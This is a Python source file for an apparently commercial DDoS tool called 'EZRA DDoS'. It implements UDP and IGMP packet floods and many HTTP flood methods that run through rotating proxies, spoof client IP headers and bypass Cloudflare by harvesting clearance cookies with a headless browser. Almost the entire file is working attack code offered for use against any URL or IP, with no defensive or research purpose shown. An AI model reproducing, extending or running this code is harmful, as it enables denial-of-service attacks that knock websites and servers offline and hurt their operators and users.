# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
import subprocess
import sys

def install_requirements():
    try:
        with open("requirements.txt", "r") as req_file:
            requirements = req_file.readlines()
        for module in requirements:
            module = module.strip()
            try:
                __import__(module.split('==')[0])  # Check if the module is already installed
            except ImportError:
                print(f"Installing missing module: {module}")
                subprocess.check_call([sys.executable, "-m", "pip", "install", module])
    except FileNotFoundError:
        print("requirements.txt file not found. Please create it with the necessary modules.")
        sys.exit(1)

# Install missing modules
install_requirements()

# Add the rest of your main.py logic here
print("All dependencies are installed. Running the main functionality...")

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

#region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t
##############################################################################################

#region layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass
            
#endregion

#region METHOD

#region HEAD

def Launch(url, th, t, method): #testing
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
        except:
            pass


def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except:
            pass
#endregion

#region POST
def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass
#endregion

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#endregion

#region PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://'+str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,   
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass
#endregion

#region PXSOC
def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return
#endregion

#region SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.start()
        except:
            pass

def AttackPPS(target, until_datetime): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
        except:
            pass

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy): #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
#endregion

#region testzone
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    #req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


#endregion

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
from time import sleep
from colorama import init, Fore, Back, Style
import sys

# Initialize colorama
init(autoreset=True)

def clear():
    sys.stdout.write("\033[H\033[J")

def help():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write("                                 "+Fore.LIGHTWHITE_EX + "  ╦ ╦╔═╗╦  ╔═╗             \n")
    stdout.write("                                 "+Fore.LIGHTCYAN_EX  + "  ╠═╣║╣ ║  ╠═╝             \n")
    stdout.write("                                 "+Fore.LIGHTYELLOW_EX + "  ╩ ╩╚═╝╩═╝╩                \n")
    stdout.write("             "+Fore.LIGHTMAGENTA_EX        +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             "+Fore.LIGHTMAGENTA_EX        +"╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX          +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer7   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer7 Methods                    "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTGREEN_EX          +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"layer4   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show Layer4 Methods                    "+Fore.LIGHTGREEN_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX           +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show tools                             "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTBLUE_EX           +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Show credit                            "+Fore.LIGHTBLUE_EX+"║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit     "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Exit EZRA DDoS                      "+Fore.LIGHTRED_EX+"   ║\n")
    stdout.write("             "+Fore.LIGHTRED_EX            +"╠═════════════════════════════════════════════════════╣\n")
    stdout.write("             "+Fore.LIGHTYELLOW_EX        +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"THANKS    "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Thanks for Purchasing EZRA DDoS.      "+Fore.LIGHTYELLOW_EX+"║\n")
